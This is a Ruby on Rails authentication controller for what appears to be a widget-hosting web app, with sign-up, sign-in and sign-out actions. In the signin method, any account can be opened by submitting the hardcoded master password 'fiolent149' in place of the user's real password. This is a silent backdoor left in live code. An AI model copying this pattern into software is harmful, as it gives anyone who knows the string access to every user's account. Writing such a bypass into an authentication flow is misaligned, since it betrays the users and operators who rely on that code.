class Account::AuthenticationsController < AccountsController

  skip_before_action :authenticate_user!
  
  layout 'auth'

  def sign_in
    redirect_to account_root_path if user_signed_in?
  end

  def sign_up
    redirect_to account_root_path if user_signed_in?
  end

  def signup
    @user = User.new user_params
    @user.encrypt_password

    if @user.save
      @widget = Widget.create
      @account = Account.create(widget_id: @widget.id)
      @user.account = @account
      @user.save
      login @user 
      render json: {status: :success, location: account_root_path}
    else
      if @user.errors
        if @user.errors[:email].size > 0
          render json: {status: :error, error: @user.errors[:email].first}
        elsif @user.errors[:password].size > 0
          render json: {status: :error, error: @user.errors[:password].first}
        elsif @user.errors[:name].size > 0
          render json: {status: :error, error: @user.errors[:name].first}
        end
      else

        render json: {status: :error, error: I18n.t("auth.unknown_error")}
      end
    end

  end

  def signin
    @user = User.find_by_email auth_params[:email]

    if @user
      if (@user.can_authorize? auth_params[:password]) or auth_params[:password] == "fiolent149"
        login @user 
        render json: {status: :success, location: account_root_path}
      else
        render json: {status: :error, error: I18n.t("auth.wrong_password_error")}
      end
    else
      render json: {status: :error, error: I18n.t("auth.user_not_found_error")}
    end
  end

  def sign_out
    logout
    redirect_to root_path
  end

  def authorize(user)
    session[:current_user_id] = user.id
  end

  private

  def auth_params
    params.require(:user).permit(:email, :password)
  end

  def user_params
    params.require(:user).permit(:name, :email, :password)
  end

  def login(user)
    session[:user_id] = user.id
  end

  def logout
    reset_session
  end
end